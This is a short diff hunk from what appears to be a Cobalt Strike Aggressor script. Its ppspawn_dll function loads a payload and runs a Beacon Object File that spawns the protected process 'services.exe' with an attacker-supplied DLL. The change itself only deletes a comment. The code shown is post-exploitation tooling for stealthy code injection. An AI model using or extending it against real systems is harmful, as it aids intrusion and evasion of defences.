@@ -26,9 +26,6 @@ sub ppspawn_dll {
 	$payb = readb( $payf, -1 );
 	closef( $payf );
 
-	##
-	## Note: Have a list of random process's to choose from.
-	##
 	$args = bof_pack( $1, "ZZZbi", $dlln, $lnkn, "services.exe", $payb, $3 );
 	beacon_inline_execute( $1, $bofb, "SpawnProtectedProcessWithLibrary", $args );
 }
